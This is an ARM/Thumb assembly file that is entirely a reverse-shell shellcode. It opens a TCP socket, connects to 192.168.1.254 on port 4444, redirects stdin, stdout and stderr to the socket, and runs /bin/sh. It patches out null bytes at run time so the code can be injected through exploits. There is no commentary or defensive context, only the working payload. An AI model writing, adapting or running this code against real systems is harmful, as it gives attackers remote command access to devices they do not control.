.section .text
.global _start
_start:
	.ARM
	add r3, pc, #1
	bx r3

	.THUMB
// socket(2, 1, 0)
	mov r7, #200
	add r7, #81
	mov r0, #2
	mov r1, #1
	eor r2, r2, r2
	svc #1
	mov r4, r0

// connect(sockfd, struct_addr, 16)
	add r7, #2
	adr r1, struct_addr
	strb r2, [r1, #1]
	strb r2, [r1, #6]
	mov r2, #16
	svc #1

//dup2(sockfd, 0)
	mov r7, #63
	mov r0, r4
	eor r1, r1, r1
	svc #1

//dup2(sockfd, 1)
	mov r0, r4
	add r1, #1
	svc #1

//dup2(sockfd, 2)
	mov r0, r4
	add r1, #1
	svc #1
	
//execve("/bin/sh", 0, 0)
	mov r7, #11
	adr r0, payload
	eor r1, r1, r1
	eor r2, r2, r2
	strb r1, [r0, #7]
	svc #1
	nop


struct_addr:
.ascii "\x02\xff"
.ascii "\x11\x5c" 
.byte 192,168,1,254

payload:
.ascii "/bin/shX"

